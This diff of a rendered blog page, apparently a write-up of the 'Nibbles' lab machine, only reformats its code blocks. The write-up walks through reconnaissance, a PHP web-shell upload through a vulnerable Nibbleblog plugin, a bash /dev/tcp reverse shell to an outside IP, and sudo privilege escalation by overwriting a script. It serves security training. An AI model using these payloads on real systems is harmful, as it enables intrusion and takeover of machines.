@@ -84,13 +84,31 @@
 <h2 id="enumeration">Enumeration</h2>
 <p><code class="language-plaintext highlighter-rouge">nmap</code> found the following ports open:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 <p>A detailed script+service scan reveals the following information:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
@@ -105,14 +123,30 @@
 |_  Supported Methods: POST OPTIONS GET HEAD
 |_http-title: Site doesn't have a title (text/html).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="http">HTTP</h2>
 <p>Running on port <code class="language-plaintext highlighter-rouge">80</code> is an <code class="language-plaintext highlighter-rouge">http</code> website running <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.18</code>:<br />
 <img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213170012.png" alt="Pasted image 20250213170012.png" /><br />
 Viewing the page source reveals something interesting:</p>
 
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;b&gt;</span>Hello world!<span class="nt">&lt;/b&gt;</span>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;b&gt;</span>Hello world!<span class="nt">&lt;/b&gt;</span>
 
 
 
@@ -128,12 +162,30 @@ Viewing the page source reveals something interesting:</p>
 
 
 <span class="c">&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</span>
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 <p>Navigating to that directory we find the following homepage:<br />
 <img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213170207.png" alt="Pasted image 20250213170207.png" />
 A directory scan on the webroot found these directories:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>________________________________________________
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>________________________________________________
 
  :: Method           : GET
  :: URL              : http://10.129.200.170/FUZZ
@@ -151,11 +203,22 @@ ________________________________________________
 index.html              [Status: 200, Size: 93, Words: 8, Lines: 17, Duration: 305ms]
 server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 287ms]
 :: Progress: [4739/4739] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 <p>Nothing quite so interesting as they’re all forbidden aside from <code class="language-plaintext highlighter-rouge">index.html</code><br />
 A directory scan on the <code class="language-plaintext highlighter-rouge">nibbleblog</code> directory found:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.hta                 (Status: 403) [Size: 304]
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>/.hta                 (Status: 403) [Size: 304]
 /.htpasswd            (Status: 403) [Size: 309]
 /.htaccess            (Status: 403) [Size: 309]
 /README               (Status: 200) [Size: 4628]
@@ -166,7 +229,7 @@ A directory scan on the <code class="language-plaintext highlighter-rouge">nibbl
 /languages            (Status: 301) [Size: 331] [--&gt; http://10.129.200.170/nibbleblog/languages/]
 /plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.200.170/nibbleblog/plugins/]
 /themes               (Status: 301) [Size: 328] [--&gt; http://10.129.200.170/nibbleblog/themes/]
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 <p>We have found a login page: <code class="language-plaintext highlighter-rouge">/nibbleblog/admin.php</code>:<br />
 <img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213175925.png" alt="Pasted image 20250213175925.png" />
 Looking through the rest of the files we find <code class="language-plaintext highlighter-rouge">users.xml</code> which confirmed the username <code class="language-plaintext highlighter-rouge">admin</code> and some sort of blacklist which occurs when more than 5 incorrect login attempts are made:<br />
@@ -181,11 +244,23 @@ Viewing the <code class="language-plaintext highlighter-rouge">plugins</code> we
 <p>The following <a href="https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/">exploit</a> seems to be present on the enumerated version (<code class="language-plaintext highlighter-rouge">v4.0.3</code>).
 Uploading the following PoC using the <code class="language-plaintext highlighter-rouge">my image</code> plugin:</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span><span class="cp">?&gt;</span>
-</code></pre></div></div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span><span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
 <p>Leads to the following errors being shown:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
 
 Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
 
@@ -196,56 +271,78 @@ Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given 
 Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
 
 Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>Ignoring these and checking back on the homepage of the blog we can see the image title and caption for the image we uploaded:<br />
 <img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213181150.png" alt="Pasted image 20250213181150.png" />
 opening the image in a new tab redirects to the following directory:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.jpg
-</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.jpg
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>if we replace <code class="language-plaintext highlighter-rouge">.jpg</code> with <code class="language-plaintext highlighter-rouge">.php?cmd=id</code> we get the following response:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
-</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>Success! we have a <code class="language-plaintext highlighter-rouge">WebShell!</code>
 Uploading the following <code class="language-plaintext highlighter-rouge">PoC</code>:</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.87/9001 0&gt;&amp;1'"</span><span class="p">)</span><span class="cp">?&gt;</span>
-</code></pre></div></div>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.87/9001 0&gt;&amp;1'"</span><span class="p">)</span><span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>Starting a listener:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9001
-</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nc -lvnp 9001
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>And then browsing to the shell location:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
-</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>Leads to a <code class="language-plaintext highlighter-rouge">RevShell</code>!:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9001
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>nc -lvnp 9001
 Listening on 0.0.0.0 9001
 Connection received on 10.129.200.170 34030
 bash: cannot set terminal process group (1257): Inappropriate ioctl for device
 bash: no job control in this shell
 nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h1 id="post-exploitation">Post Exploitation</h1>
 <p>Looking around in our shell we find that we can run the following sudo command with no password:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>sudo -l
 (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>Seeing as we have write permissions in the home directory:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>ls -la
 total 24
 drwxr-xr-x 4 nibbler nibbler 4096 Feb 14 01:11 .
 drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
@@ -254,23 +351,28 @@ drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
 drwxr-xr-x 3 nibbler nibbler 4096 Feb 14 01:11 personal
 -r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
 -r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 <p>We can create a file called <code class="language-plaintext highlighter-rouge">monitor.sh</code> in <code class="language-plaintext highlighter-rouge">~/personal/stuff</code> with the following contents:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
 bash
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>We then set the file to be executable:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x monitor.sh
-</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">chmod</span> +x monitor.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>and when we execute it as <code class="language-plaintext highlighter-rouge">sudo</code> we get a root shell!:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ./monitor.sh
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>sudo ./monitor.sh
 root@Nibbles:/home/nibbler/personal/stuff#
-</code></pre></div></div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 
 
